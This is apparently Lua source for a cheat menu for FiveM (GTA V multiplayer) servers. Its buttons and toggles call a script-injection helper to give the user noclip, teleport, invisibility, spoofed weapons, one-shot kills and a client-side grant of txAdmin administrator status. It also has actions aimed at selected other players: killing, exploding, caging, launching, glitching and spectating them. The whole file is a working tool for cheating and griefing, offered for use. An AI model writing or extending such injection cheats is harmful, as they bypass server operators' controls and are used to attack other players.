playerMovementMenu:AddToggle("Noclip Follow Pitch", function(val)
    Utils.InjectScript("setNoclipFollowHeading", nil, val)
    if ShowNotification then ShowNotification("Noclip Follow Pitch", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

local noclipVisibilityOptions = { "Default", "Native Invisible", "Local Invisible" }
local noclipVisibilityMap = {
    ["Default"] = 0,
    ["Native Invisible"] = 1,
    ["Local Invisible"] = 2
}

playerMovementMenu:AddOptions("Noclip Visibility", noclipVisibilityOptions, function(val)
    local mode = noclipVisibilityMap[val] or 0
    Utils.InjectScript("setInvisibleNoclipMode", nil, mode)
    if ShowNotification then ShowNotification("Noclip Visibility", "Mode set to " .. val, "success", 2000) end
end)

playerMovementMenu:AddToggle("Freecam", function(val)
    if val then
        EnableFreecam()
    else
        DisableFreecam()
    end
    if ShowNotification then ShowNotification("Freecam", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

local TELEPORT_LOCATIONS = {
    ["FIB Building"]     = vector3(140.43, -750.52, 258.15),
    ["Mission Row PD"]   = vector3(425.1, -979.5, 30.7),
    ["Pillbox Hospital"] = vector3(308.6, -595.3, 43.28),
    ["Del Perro Pier"]   = vector3(-1632.87, -1007.81, 13.07),
    ["Grove Street"]     = vector3(109.63, -1943.14, 20.80),
    ["Legion Square"]    = vector3(229.21, -871.61, 30.49),
    ["LS Customs"]       = vector3(-365.4, -131.8, 37.7),
    ["Maze Bank"]        = vector3(-75.24, -818.95, 326.1),
    ["Vespucci Beach"]   = vector3(-1223.8, -1516.6, 4.4),
    ["Vinewood"]         = vector3(293.2, 180.5, 104.3),
    ["Sandy Shores"]     = vector3(1843.10, 3707.60, 33.52),
}
local TELEPORT_LOCATIONS_NAMES = {}
for i, v in pairs(TELEPORT_LOCATIONS) do table.insert(TELEPORT_LOCATIONS_NAMES, i) end

playerMovementMenu:AddOptions("Teleport to ", TELEPORT_LOCATIONS_NAMES, function(val)
    local cords = TELEPORT_LOCATIONS[val]
    Utils.InjectScript("teleportToCoords", nil, cords.x, cords.y, cords.z)
    if ShowNotification then ShowNotification("Teleport", "Teleported to " .. val, "success", 2000) end
end)

playerMovementMenu:AddToggle("TX Noclip", function(value)
    if value then
        Utils.InjectScript("txAdmin:setMode", nil, "noclip", true)
    else
        Utils.InjectScript("txAdmin:setMode", nil, "none", true)
    end
    if ShowNotification then ShowNotification("TX Noclip", value and "Enabled" or "Disabled", value and "success" or "info", 2000) end
end, false)

playerMovementMenu:AddToggle("Anti Freeze", function(value)
    Utils.InjectScript("antiFreeze", nil, value)
    if ShowNotification then ShowNotification("Anti Freeze", value and "Enabled" or "Disabled", value and "success" or "info", 2000) end
end, false)

playerMovementMenu:AddToggle("Super Speed", function(val)
    Utils.InjectScript("SuperSpeed", nil, val)
    if ShowNotification then ShowNotification("Super Speed", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

local miscMenu = playerMultiMenu:AddCategory("Misc")
miscMenu:AddToggle("Invisibility", function(val)
    Utils.InjectScript("setVisible", nil, val)
    if ShowNotification then ShowNotification("Invisibility", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Show TX Ids", function(value)
    Utils.InjectScript("showTxAdmin", "monitor", value)
    if ShowNotification then ShowNotification("TX IDs", value and "Enabled" or "Disabled", value and "success" or "info", 2000) end
end, false)

miscMenu:AddButton("Give TX Admin (Client-Side)", function()
    Utils.InjectScript("txAdmin:setAdmin")
    if ShowNotification then ShowNotification("TX Admin", "Admin privileges granted", "success", 2000) end
end)

miscMenu:AddToggle("Open Nearby Inventory (F6)", function(val)
    Utils.InjectScript("openNearbyInventory", nil, val)
    if ShowNotification then ShowNotification("Open Nearby Inventory", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Super Punch", function(val)
    Utils.InjectScript("superPunch", nil, val)
    if ShowNotification then ShowNotification("Super Punch", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Pickup/Throw Vehicles", function(val)
    Utils.InjectScript("pickupThrowVehicles", nil, val)
    if ShowNotification then ShowNotification("Pickup/Throw Vehicles", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Solo Session", function(val)
    Utils.InjectScript("soloSession", nil, val)
    if ShowNotification then ShowNotification("Solo Session", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Tiny Ped", function(val)
    Utils.InjectScript("tinyPed", nil, val)
    if ShowNotification then ShowNotification("Tiny Ped", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Force Third Person", function(val)
    Utils.InjectScript("forceThirdPerson", nil, val)
    if ShowNotification then ShowNotification("Force Third Person", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddToggle("Force Driveby", function(val)
    Utils.InjectScript("forceDriveby", nil, val)
    if ShowNotification then ShowNotification("Force Driveby", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

miscMenu:AddOptions("Clear Tasks", {"Primary", "Secondary"}, function(val)
    Utils.InjectScript("clearTasks", nil, val)
    if ShowNotification then ShowNotification("Clear Tasks", "Cleared " .. val .. " tasks", "success", 2000) end
end)

miscMenu:AddDivider("Buttons")

miscMenu:AddButton("Force GPS", function()
    Utils.InjectScript("forceGPS")
    if ShowNotification then ShowNotification("Force GPS", "GPS forced", "success", 2000) end
end)

miscMenu:AddButton("Force Ragdoll", function()
    Utils.InjectScript("forceRagdoll")
    if ShowNotification then ShowNotification("Force Ragdoll", "Ragdoll forced", "success", 2000) end
end)

miscMenu:AddToggle("Laser Eyes (left alt)", function(val)
    Utils.InjectScript("laserEyes", nil, val)
    if ShowNotification then ShowNotification("Laser Eyes", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

-- Wardrobe Category
local wardrobeMenu = playerMultiMenu:AddCategory("Wardrobe")

wardrobeMenu:AddButton("Random Outfit", function()
    Utils.InjectScript("randomOutfit")
    if ShowNotification then ShowNotification("Random Outfit", "Outfit randomized", "success", 2000) end
end)

wardrobeMenu:AddDivider("Ped Options")

wardrobeMenu:AddOptions("Freemode", {"Freemode Male", "Freemode Female"}, function(val)
    local pedModel = (val == "Freemode Male") and "mp_m_freemode_01" or "mp_f_freemode_01"
    Utils.InjectScript("setPedModel", nil, pedModel)
    if ShowNotification then ShowNotification("Freemode", "Changed to " .. val, "success", 2000) end
end)

local pedModels = {
    "player_zero", "player_one", "player_two", "ig_lamardavis", "ig_jimmydisanto",
    "ig_amandatownley", "ig_tracydisanto", "ig_ronsch", "ig_wade", "ig_davenorton",
    "ig_stevehains", "ig_devin", "ig_floyd", "ig_chef", "ig_lestercrest",
    "a_c_chop", "ig_brad", "s_m_y_cop_01", "s_f_y_cop_01", "s_m_y_swat_01",
    "s_m_y_sheriff_01", "s_f_y_sheriff_01", "s_m_y_hwaycop_01", "s_m_m_fibsec_01",
    "s_f_m_fiboffice_02", "s_m_m_paramedic_01", "s_m_y_fireman_01", "s_m_m_doctor_01",
    "s_m_y_construct_01", "s_m_m_pilot_02", "s_f_y_airhostess_01", "s_m_y_business_01",
    "s_f_y_business_01", "g_m_y_mexgoon_02", "g_m_y_ballaorig_01", "g_m_y_ballasout_01",
    "g_f_y_ballas_01", "g_m_y_ballaeast_01", "g_m_y_famca_01", "g_m_y_famdnf_01",
    "g_m_y_mexgoon_01", "g_m_y_mexgoon_03", "g_m_y_lost_01", "g_m_y_lost_02",
    "g_f_y_lost_01", "s_m_y_marine_01", "s_m_y_marine_02", "s_m_y_marine_03",
    "s_m_y_prismuscl_01", "s_m_m_prisguard_01", "s_m_m_ciasec_01", "s_m_m_security_01",
    "s_m_m_janitor", "a_m_m_tramp_01", "a_f_m_tramp_01", "s_f_y_hooker_01",
    "s_f_y_hooker_02", "a_m_y_beach_01", "a_f_y_beach_01", "a_m_y_tourist_01",
    "a_f_y_tourist_01", "a_m_y_skater_01", "a_m_y_hipster_01", "a_f_y_hipster_01",
    "s_m_m_bouncer_01", "mp_m_shopkeep_01", "s_m_y_chef_01", "s_m_y_barman_01",
    "s_m_y_waiter_01", "s_m_y_xmech_02", "s_m_m_trucker_01", "s_m_m_gardener_01",
    "a_m_m_farmer_01", "s_m_y_dockwork_01", "s_m_y_garbage", "s_m_m_postal_01",
    "s_m_o_busker_01", "s_m_m_pilot_01", "s_f_y_airhostess_01", "s_m_y_hwaycop_01",
    "s_m_m_ciasec_01", "s_m_m_fiboffice_02", "s_f_y_scrubs_01", "s_m_m_pilot_02",
    "a_m_m_hillbilly_02", "a_m_m_hiker_01", "a_f_m_hiker_01", "a_m_m_golfer_01",
    "a_f_m_golfer_01", "a_m_m_tennis_01", "a_f_m_tennis_01"
}

local pedNames = {
    "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton",
    "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad",
    "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
    "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
    "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
    "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
    "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
    "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
    "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
    "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
    "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
    "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
    "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
    "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
}

wardrobeMenu:AddOptions("Peds", pedNames, function(val)
    local idx = 1
    for i, name in ipairs(pedNames) do
        if name == val then
            idx = i
            break
        end
    end
    if pedModels[idx] then
        Utils.InjectScript("setPedModel", nil, pedModels[idx])
        if ShowNotification then ShowNotification("Peds", "Changed to " .. val, "success", 2000) end
    end
end)

local animalModels = {
    "a_c_boar", "a_c_cat_01", "a_c_hen", "a_c_chimp", "a_c_cow", "a_c_coyote",
    "a_c_crow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_humpback",
    "a_c_husky", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pigeon",
    "a_c_poodle", "a_c_pug", "a_c_rabbit_01", "a_c_rat", "a_c_retriever",
    "a_c_rhesus", "a_c_rottweiler", "a_c_seagull", "a_c_shepherd", "a_c_stingray",
    "a_c_sharktiger", "a_c_sharkhammer", "a_c_chickenhawk", "a_c_cormorant"
}

local animalNames = {
    "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow",
    "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky",
    "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle",
    "Pug", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
    "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark",
    "Hammerhead Shark", "Chickenhawk", "Cormorant"
}

wardrobeMenu:AddOptions("Animal Peds", animalNames, function(val)
    local idx = 1
    for i, name in ipairs(animalNames) do
        if name == val then
            idx = i
            break
        end
    end
    if animalModels[idx] then
        Utils.InjectScript("setPedModel", nil, animalModels[idx])
        if ShowNotification then ShowNotification("Animal Peds", "Changed to " .. val, "success", 2000) end
    end
end)

wardrobeMenu:AddDivider("Custom Outfit")

-- Custom Outfit Components
local outfitNumbers = {}
for i = 1, 200 do
    table.insert(outfitNumbers, tostring(i))
end

wardrobeMenu:AddOptions("Hat", outfitNumbers, function(val)
    Utils.InjectScript("setPedHat", nil, tonumber(val))
    if ShowNotification then ShowNotification("Hat", "Hat set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("Mask", outfitNumbers, function(val)
    Utils.InjectScript("setPedMask", nil, tonumber(val))
    if ShowNotification then ShowNotification("Mask", "Mask set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("Glasses", outfitNumbers, function(val)
    Utils.InjectScript("setPedGlasses", nil, tonumber(val))
    if ShowNotification then ShowNotification("Glasses", "Glasses set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("Torso", outfitNumbers, function(val)
    Utils.InjectScript("setPedTorso", nil, tonumber(val))
    if ShowNotification then ShowNotification("Torso", "Torso set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("T-shirt", outfitNumbers, function(val)
    Utils.InjectScript("setPedTshirt", nil, tonumber(val))
    if ShowNotification then ShowNotification("T-shirt", "T-shirt set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("Pants", outfitNumbers, function(val)
    Utils.InjectScript("setPedPants", nil, tonumber(val))
    if ShowNotification then ShowNotification("Pants", "Pants set to " .. val, "success", 2000) end
end)

wardrobeMenu:AddOptions("Shoes", outfitNumbers, function(val)
    Utils.InjectScript("setPedShoes", nil, tonumber(val))
    if ShowNotification then ShowNotification("Shoes", "Shoes set to " .. val, "success", 2000) end
end)


local VEHICLE_MULTI_MENU = MENU:NewMultiCategory("Vehicle")
local spawnerMenu = VEHICLE_MULTI_MENU:AddCategory("Spawner")

local vehicleModifierMenu = VEHICLE_MULTI_MENU:AddCategory("Modifications")

--

spawnerMenu:AddButton("Print Custom Cars", function()
    Utils.InjectScript("printAllCustomCars")
    if ShowNotification then ShowNotification("Vehicle", "Vehicle repaired", "success", 2000) end
end)

vehicleModifierMenu:AddButton("Repair Vehicle", function()
    Utils.InjectScript("repairVehicle")
    if ShowNotification then ShowNotification("Vehicle", "Vehicle repaired", "success", 2000) end
end)

vehicleModifierMenu:AddButton("Max Upgrade", function()
    Utils.InjectScript("maxUpgradeVehicle")
    if ShowNotification then ShowNotification("Vehicle", "Vehicle max upgraded", "success", 2000) end
end)

vehicleModifierMenu:AddButton("Clean Vehicle", function()
    Utils.InjectScript("cleanVehicle")
    if ShowNotification then ShowNotification("Vehicle", "Vehicle cleaned", "success", 2000) end
end)

vehicleModifierMenu:AddToggle("Invincible", function(val)
    Utils.InjectScript("setVehicleInvincible", nil, val)
    if ShowNotification then ShowNotification("Vehicle", "Invincible " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

vehicleModifierMenu:AddToggle("Easy Handling", function(val)
    Utils.InjectScript("setEnginePower", nil, val)
    if ShowNotification then ShowNotification("Vehicle", "Easy Handling " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

vehicleModifierMenu:AddToggle("Shift Boost", function(val)
    Utils.InjectScript("setEnginePower", nil, val)
    if ShowNotification then ShowNotification("Vehicle", "Shift Boost " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

vehicleModifierMenu:AddButton("Start Vehicle Engine", function()
    Utils.InjectScript("startVehicleEngine")
    if ShowNotification then ShowNotification("Vehicle", "Engine started", "success", 2000) end
end)

vehicleModifierMenu:AddButton("Delete Vehicle", function()
    Utils.InjectScript("deleteVehicle")
    if ShowNotification then ShowNotification("Vehicle", "Vehicle deleted", "warning", 2000) end
end)

vehicleModifierMenu:AddToggle("Infinite Fuel", function(val)
    Utils.InjectScript("setInfiniteFuel", nil, val)
    if ShowNotification then ShowNotification("Vehicle", "Infinite Fuel " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

spawnerMenu:AddButton("Spawn Custom Vehicle", function()
    MENU:InputBox("VEHICLE_MODEL", function(val)
        if val and val ~= "" then
            SpawnVehicleByModel(val)
            if ShowNotification then ShowNotification("Vehicle", "Spawned " .. val, "success", 2000) end
        end
    end, false)
end)

spawnerMenu:AddDivider("GTA Vehicles")

for class, classOptions in pairs(VehicleSorted) do
    if #classOptions > 0 then
        spawnerMenu:AddOptions(VehicleClasses[class] or "Unknown", classOptions, function(value)
            SpawnVehicleByModel(value)
            if ShowNotification then ShowNotification("Vehicle", "Spawned " .. value, "success", 2000) end
        end)
    end
end

local WEAPONS = MENU:NewMultiCategory("Weapon")

local weaponSpawnMenu = WEAPONS:AddCategory("Weapons")

weaponSpawnMenu:AddButton("Spoof All Weapons", function()
    Utils.InjectScript("spoofAllWeapons")
    if ShowNotification then ShowNotification("Spoof All Weapons", "All weapons spoofed", "success", 2000) end
end)

weaponSpawnMenu:AddButton("Give Custom Weapon", function()
    MENU:InputBox("WEAPON_NAME", function(val)
        if val and val ~= "" then
            local weaponHash = ConvertToWeaponHash(val)
            GiveWeapon(weaponHash)
            if ShowNotification then ShowNotification("Weapon", "Gave " .. val, "success", 2000) end
        end
    end, false)
end)

weaponSpawnMenu:AddDivider("Weapons")

local WeaponCategories = {
    ["Pistols"] = {
        { label = "Pistol", value = "weapon_pistol" },
        { label = "Pistol MK2", value = "weapon_pistol_mk2" },
        { label = "Combat Pistol", value = "weapon_combatpistol" },
        { label = "AP Pistol", value = "weapon_appistol" },
        { label = "Stun Gun", value = "weapon_stungun" },
        { label = "Pistol .50", value = "weapon_pistol50" },
        { label = "SNS Pistol", value = "weapon_snspistol" },
        { label = "SNS Pistol MK2", value = "weapon_snspistol_mk2" },
        { label = "Heavy Pistol", value = "weapon_heavypistol" },
        { label = "Vintage Pistol", value = "weapon_vintagepistol" },
        { label = "Flare Gun", value = "weapon_flaregun" },
        { label = "Marksman Pistol", value = "weapon_marksmanpistol" },
        { label = "Revolver", value = "weapon_revolver" },
        { label = "Revolver MK2", value = "weapon_revolver_mk2" },
        { label = "Double Action Revolver", value = "weapon_doubleaction" }
    },
    ["SMGs"] = {
        { label = "Micro SMG", value = "weapon_microsmg" },
        { label = "SMG", value = "weapon_smg" },
        { label = "SMG MK2", value = "weapon_smg_mk2" },
        { label = "Assault SMG", value = "weapon_assaultsmg" },
        { label = "Combat PDW", value = "weapon_combatpdw" },
        { label = "Machine Pistol", value = "weapon_machinepistol" },
        { label = "Mini SMG", value = "weapon_minismg" }
    },
    ["Shotguns"] = {
        { label = "Pump Shotgun", value = "weapon_pumpshotgun" },
        { label = "Pump Shotgun MK2", value = "weapon_pumpshotgun_mk2" },
        { label = "Sawed-Off Shotgun", value = "weapon_sawnoffshotgun" },
        { label = "Assault Shotgun", value = "weapon_assaultshotgun" },
        { label = "Bullpup Shotgun", value = "weapon_bullpupshotgun" },
        { label = "Heavy Shotgun", value = "weapon_heavyshotgun" },
        { label = "Musket", value = "weapon_musket" },
        { label = "Double Barrel Shotgun", value = "weapon_dbshotgun" },
        { label = "Sweeper Shotgun", value = "weapon_autoshotgun" }
    },
    ["Rifles"] = {
        { label = "Assault Rifle", value = "weapon_assaultrifle" },
        { label = "Assault Rifle MK2", value = "weapon_assaultrifle_mk2" },
        { label = "Carbine Rifle", value = "weapon_carbinerifle" },
        { label = "Carbine Rifle MK2", value = "weapon_carbinerifle_mk2" },
        { label = "Advanced Rifle", value = "weapon_advancedrifle" },
        { label = "Special Carbine", value = "weapon_specialcarbine" },
        { label = "Special Carbine MK2", value = "weapon_specialcarbine_mk2" },
        { label = "Bullpup Rifle", value = "weapon_bullpuprifle" },
        { label = "Bullpup Rifle MK2", value = "weapon_bullpuprifle_mk2" },
        { label = "Military Rifle", value = "weapon_militaryrifle" }
    },
    ["Snipers"] = {
        { label = "Sniper Rifle", value = "weapon_sniperrifle" },
        { label = "Heavy Sniper", value = "weapon_heavysniper" },
        { label = "Heavy Sniper MK2", value = "weapon_heavysniper_mk2" },
        { label = "Marksman Rifle", value = "weapon_marksmanrifle" },
        { label = "Marksman Rifle MK2", value = "weapon_marksmanrifle_mk2" }
    },
    ["Heavy"] = {
        { label = "RPG", value = "weapon_rpg" },
        { label = "Grenade Launcher", value = "weapon_grenadelauncher" },
        { label = "Minigun", value = "weapon_minigun" },
        { label = "Firework Launcher", value = "weapon_firework" },
        { label = "Railgun", value = "weapon_railgun" },
        { label = "Homing Launcher", value = "weapon_hominglauncher" },
        { label = "Compact Grenade Launcher", value = "weapon_compactlauncher" },
        { label = "Widowmaker", value = "weapon_widowmaker" }
    },
    ["Melee"] = {
        { label = "Knife", value = "weapon_knife" },
        { label = "Nightstick", value = "weapon_nightstick" },
        { label = "Hammer", value = "weapon_hammer" },
        { label = "Bat", value = "weapon_bat" },
        { label = "Crowbar", value = "weapon_crowbar" },
        { label = "Golf Club", value = "weapon_golfclub" },
        { label = "Bottle", value = "weapon_bottle" },
        { label = "Dagger", value = "weapon_dagger" },
        { label = "Hatchet", value = "weapon_hatchet" },
        { label = "Machete", value = "weapon_machete" },
        { label = "Flashlight", value = "weapon_flashlight" },
        { label = "Switchblade", value = "weapon_switchblade" },
        { label = "Battle Axe", value = "weapon_battleaxe" },
        { label = "Pool Cue", value = "weapon_poolcue" },
        { label = "Wrench", value = "weapon_wrench" },
        { label = "Stone Hatchet", value = "weapon_stone_hatchet" }
    },
    ["Throwables"] = {
        { label = "Grenade", value = "weapon_grenade" },
        { label = "Sticky Bomb", value = "weapon_stickybomb" },
        { label = "Proximity Mine", value = "weapon_proxmine" },
        { label = "Tear Gas", value = "weapon_teargas" },
        { label = "Molotov", value = "weapon_molotov" },
        { label = "Fire Extinguisher", value = "weapon_fireextinguisher" },
        { label = "Jerry Can", value = "weapon_petrolcan" },
        { label = "Snowball", value = "weapon_snowball" },
        { label = "Pipe Bomb", value = "weapon_pipebomb" },
        { label = "Ball", value = "weapon_ball" },
        { label = "BZ Gas", value = "weapon_bzgas" }
    }
}

for category, weapons in pairs(WeaponCategories) do
    local weaponLabels = {}
    local weaponValues = {}
    for _, weapon in ipairs(weapons) do
        table.insert(weaponLabels, weapon.label)
        table.insert(weaponValues, weapon.value)
    end
    weaponSpawnMenu:AddOptions(category, weaponLabels, function(val)
        local idx = 1
        for i, label in ipairs(weaponLabels) do
            if label == val then
                idx = i
                break
            end
        end
        local weaponHash = weaponValues[idx]
        if weaponHash then
        GiveWeapon(weaponHash)
        if ShowNotification then ShowNotification("Weapon", "Gave " .. val, "success", 2000) end
        end
    end)
end
local WEAPONSModifierMenu = WEAPONS:AddCategory("Modifications")

WEAPONSModifierMenu:AddButton("Give Max Ammo", function()
    Utils.InjectScript("giveMaxAmmo")
    if ShowNotification then ShowNotification("Weapon", "Max ammo given", "success", 2000) end
end)

WEAPONSModifierMenu:AddToggle("Infinite Ammo", function(val)
    Utils.InjectScript("setInfiniteAmmo", nil, val)
    if ShowNotification then ShowNotification("Weapon", "Infinite Ammo " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

WEAPONSModifierMenu:AddToggle("No Reload", function(val)
    Utils.InjectScript("setNoReload", nil, val)
    if ShowNotification then ShowNotification("Weapon", "No Reload " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

WEAPONSModifierMenu:AddToggle("One Shot Kill", function(val)
    Utils.InjectScript("setOneShotKill", nil, val)
    if ShowNotification then ShowNotification("Weapon", "One Shot Kill " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

WEAPONSModifierMenu:AddToggle("Explosive Ammo", function(val)
    Utils.InjectScript("setExplosiveAmmo", nil, val)
    if ShowNotification then ShowNotification("Weapon", "Explosive Ammo " .. (val and "Enabled" or "Disabled"), val and "success" or "info", 2000) end
end, false)

WEAPONSModifierMenu:AddButton("Remove All Weapons", function()
    RemoveAllPedWeapons(PlayerPedId(), true)
    if ShowNotification then ShowNotification("Weapon", "All weapons removed", "success", 2000) end
end)

WEAPONSModifierMenu:AddButton("Refill Ammo", function()
    Utils.InjectScript("refillAmmo")
    if ShowNotification then ShowNotification("Refill Ammo", "Ammo refilled", "success", 2000) end
end)

WEAPONSModifierMenu:AddToggle("Anti-Headshot", function(val)
    Utils.InjectScript("antiHeadshot", nil, val)
    if ShowNotification then ShowNotification("Anti-Headshot", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)

WEAPONSModifierMenu:AddToggle("Rainbow Gun", function(val)
    Utils.InjectScript("rainbowGun", nil, val)
    if ShowNotification then ShowNotification("Rainbow Gun", val and "Enabled" or "Disabled", val and "success" or "info", 2000) end
end, false)



local PLAYERS = MENU:NewMultiCategory("Players")
MENU.playersMenu = PLAYERS:AddCategory("Players")
MENU.playersMenu:AddPlayerToggles()

-- Player Interaction Features
local playerInteractionsMenu = PLAYERS:AddCategory("Actions")


playerInteractionsMenu:AddButton("Force Hands Up", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    ForceHandsUp(true, targetId)
    if ShowNotification then ShowNotification("Hands Up", "Forced hands of " .. targetId, "success", 2000) end
end)

playerInteractionsMenu:AddButton("Teleport To Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("teleportToPlayer", nil, targetId)
    if ShowNotification then ShowNotification("Teleport", "Teleported to player " .. targetId, "success", 2000) end
end)

playerInteractionsMenu:AddButton("Kill Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("killPlayer", nil, targetId)
    if ShowNotification then ShowNotification("Kill Player", "Killed player " .. targetId, "warning", 2000) end
end)

playerInteractionsMenu:AddToggle("Spectate Player", function(val)
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("spectatePlayer", nil, val, targetId)
    if ShowNotification then ShowNotification("Spectate", val and "Spectating player " .. targetId or "Stopped spectating", val and "success" or "info", 2000) end
end, false)

playerInteractionsMenu:AddToggle("Talk With Player", function(val)
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("talkWithPlayer", nil, targetId)
    if ShowNotification then ShowNotification("Talk With Player", val and "Talking with player " .. targetId or "Stopped talking", val and "success" or "info", 2000) end
end, false)

playerInteractionsMenu:AddButton("Steal Outfit", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("stealOutfit", nil, targetId)
    if ShowNotification then ShowNotification("Steal Outfit", "Stole outfit from player " .. targetId, "success", 2000) end
end)

-- Player Trolling Features
local playerTrollingMenu = PLAYERS:AddCategory("Trolling")

playerTrollingMenu:AddButton("Send To Sky", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("sendToSky", nil, targetId)
    if ShowNotification then ShowNotification("Send To Sky", "Sent player " .. targetId .. " to sky", "warning", 2000) end
end)

playerTrollingMenu:AddButton("Glitch Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("glitchPlayer", nil, targetId)
    if ShowNotification then ShowNotification("Glitch Player", "Glitched player " .. targetId, "warning", 2000) end
end)

playerTrollingMenu:AddButton("Cage Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("cagePlayer", nil, targetId)
    if ShowNotification then ShowNotification("Cage Player", "Caged player " .. targetId, "warning", 2000) end
end)

playerTrollingMenu:AddButton("Explode Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("explodePlayer", nil, targetId)
    if ShowNotification then ShowNotification("Explode Player", "Exploded player " .. targetId, "warning", 2000) end
end)

playerTrollingMenu:AddButton("Launch Player", function()
    local selectedPlayers = MENU.playersMenu:GetAllSelectedPlayers()
    if #selectedPlayers == 0 then
        if ShowNotification then ShowNotification("Error", "No player selected", "error", 2000) end
        return
    end
    
    local targetId = selectedPlayers[1]
    Utils.InjectScript("launchPlayer", nil, targetId)
    if ShowNotification then ShowNotification("Launch Player", "Launched player " .. targetId, "warning", 2000) end
end)

-- Vehicle Interaction Features
local playerVehicleMenu = PLAYERS:AddCategory("Vehicle")

